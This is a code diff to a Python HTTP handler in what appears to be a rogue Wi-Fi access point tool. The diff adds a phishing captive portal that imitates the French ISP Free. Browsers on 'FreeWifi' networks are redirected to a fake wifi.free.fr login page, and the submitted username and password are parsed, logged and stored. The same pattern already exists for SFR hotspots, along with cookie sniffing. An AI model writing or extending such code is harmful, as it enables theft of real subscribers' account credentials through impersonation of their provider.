@@ -342,11 +342,17 @@ class HTTPRequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
         logphishing()
       elif path != '' and os.path.exists(os.path.join(self.server.www_directory,path)):
         return self._get_file(path)
-      elif 'user-agent' in self.headers and essid in ('SFR WiFi FON', 'SFR WiFi Mobile'):
-        if user_agent_infos.browser.family in ('Chrome Mobile', 'Firefox'): #TODO add chrome, chromium...
+      elif user_agent_infos is not None and user_agent_infos.browser.family in ('Chrome Mobile', 'Firefox') and essid in ('SFR WiFi FON', 'SFR WiFi Mobile'):
           self.send_response(302)
           self.send_header('location','http://hotspot.wifi.sfr.fr/indexEncryptingChilli.php?res=notyet&uamip=192.168.2.1&uamport=6645&challenge=e721ea62a35c52023c83fea1a9b91c4&userurl=http%3a%2f%2fhackaday.com%2f&nasid=10-27-34-63-e2-83&mac=85-3B-95-72-51-C2&mode=4&channel=0')
-      
+      elif user_agent_infos is not None and user_agent_infos.browser.family in ('Chrome Mobile', 'Firefox') and essid in ('FreeWifi', 'FreeWifi_secure'):
+          self.send_response(302)
+          self.send_header('location','http://wifi.free.fr')
+      elif host == 'wifi.free.fr':
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(open('www/phishing/freewifi.html','r').read())
+        logphishing()
       else:
         self.server.app.log("Cookie sniffer for %s"%client.bssid)
         self.send_response(200)
@@ -426,6 +432,12 @@ class HTTPRequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
         self.server.app.log( "%s login is %s"%(fullpath, 
             ctxt("%s:%s"%(kvs['username'], kvs['password']),RED)) )
         user = {'uri':fullpath,'login': kvs['username'],  'password':kvs['password']}
+        client.log_login(user)
+      elif host == 'wifi.free.fr':
+        kvs = dict([ kv.split('=') for kv in urllib2.unquote(post).split('&')])
+        self.server.app.log( "%s login is %s"%(fullpath, 
+            ctxt("%s:%s"%(kvs['login'], kvs['password']),RED)) )
+        user = {'uri':fullpath,'login': kvs['login'],  'password':kvs['password']}
         client.log_login(user)
       #save content
       if length > 0:
